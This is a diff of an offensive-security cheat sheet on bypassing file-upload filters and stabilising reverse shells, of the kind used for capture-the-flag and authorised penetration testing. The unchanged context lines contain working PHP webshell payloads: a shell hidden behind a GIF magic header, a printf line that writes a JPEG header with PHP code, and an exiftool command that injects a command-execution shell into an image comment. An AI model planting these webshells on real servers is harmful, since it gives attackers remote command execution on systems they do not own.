@@ -11,17 +11,17 @@
 
 ##### ➤ Upload bypass
 
-* [Reverse shell](#reverse-shell)
-* [One liner](#one-liner)
-* [Webshell](#webshell)
-* [Online generator](#online-generator)
+* [Rename the extension](#rename-the-extension)
+* [Bypass the extension checks](#bypass-the-entension-checks)
+* [Bypass using the content-type](#bypass-using-the-content---type)
+* [Magic number](#magic-number)
 
 
 ##### ➤ Shell Stabilisation
 
-* [Technique 01: Python](#)
-* [Technique 02: Rlwrap](#)
-* [Technique 3: Socat](#)
+* [Technique 01: Python](#technique-01-python)
+* [Technique 02: Rlwrap](#technique-02-rlwrap)
+* [Technique 03: Socat](#technique-03-socat)
 
 
 
@@ -126,11 +126,27 @@ https://weibell.github.io/reverse-shell-generator/
 • Erlang Yaws Web Server: .yaws
 ```
 
+## 🔻Bypass the extension checks
+
+
+
+## 🔻Bypass using the content-type
+
+#### ➤ 1. Initial request (upload of php reverse shell)
+
+![image](https://github.com/Kiosec/Shells/assets/100965892/3aee2465-5e3d-4e45-b500-5066a61ea8dd)
+
+
+#### ➤ 2. Burp interception and modification 
+
+![image](https://github.com/Kiosec/Shells/assets/100965892/27a84575-0816-419b-86da-3d2972badfb5)
+
+
 ## 🔻Magic number
 
 An image is identified by its first bytes. It is possible to hide a webshell by including a valid img header at the beginning of the webshell file.
 
-###### ➤ GIF
+#### ➤ GIF
 ```
 Basically you just add the text "GIF89a;" before you shell-code. As exemple :
 
@@ -140,13 +156,12 @@ system($_GET['cmd']);//or you can insert your complete shell code
 ?>
 ```
 
-###### ➤ JPEG
+#### ➤ JPEG
 ```
 printf "\xff\xd8\xff\xe0<?php system('id'); ?>" > image?jpg
 ```
 
-
-#### Inject PHP code into into information/comment of the image
+#### ➤ Inject PHP code into into information/comment of the image
 ```
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.jpg
 ```
@@ -194,6 +209,7 @@ user@box:~$
 ## 🔻Technique 02: Rlwrap
 rlwrap gives a more fully featured shell including access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.
 This technique is particularly useful with the Windows shell.
+
 ```
 ➤ Step 01: Install rlwrap (not installed by default on the kali)
 apt install rlwrap
@@ -209,8 +225,9 @@ CRTL+Z
 stty raw -echo; fg
 ```
 
-## 🔻Technique 3: Socat
+## 🔻Technique 03: Socat
 Restricted to Linux target
+
 ```
 ➤ Prerequisite: Obtain Socat on the linux target.
 
